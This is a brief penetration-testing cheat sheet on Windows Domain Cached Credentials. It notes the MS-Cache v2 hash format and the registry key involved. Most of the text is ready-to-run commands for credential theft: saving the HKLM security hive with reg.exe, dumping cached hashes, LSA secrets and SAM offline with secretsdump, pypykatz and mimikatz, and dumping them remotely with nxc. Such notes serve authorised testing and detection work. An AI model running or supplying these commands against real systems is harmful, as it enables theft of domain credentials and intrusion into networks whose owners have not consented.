Domain Cached Credentials, store domain logon information when a user logged in to domain computers. For users to logon to domain when DC not accessible.

[SAM](SAM.md)

Hash format: MS-Cache v2 (hashcat 2100)
`CachedLogonCount` key in
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`

Download cache + LSA secret registry
```powershell
reg.exe save hklm\security security.save
```
(Secretsdump) Offline Dumping caches + LSA secret + SAM (needs system.save)
```bash
secretsdump -system system.save -sam sam.save -security security.save LOCAL
```
(Pypykatz) Offline dumping caches + LSA secret + SAM
```bash
pypykatz registry system.save --sam sam.save --security security.save
```
(Mimikatz) Dumping caches
```bash
mimikatz.exe lsadump::cache
```
(Mimikatz) Dumping LSA secrets
```bash
mimikatz.exe lsadump::secrets
```
(Mimikatz) Offline Dumping LSA secrets
```bash
mimikatz.exe lsadump::secrets security.save system.save
```
(NXC) Remote cache + LSA secrets dump
```bash
nxc smb <TARGET> --local-auth -u <USER> -p <PASS> --lsa
```
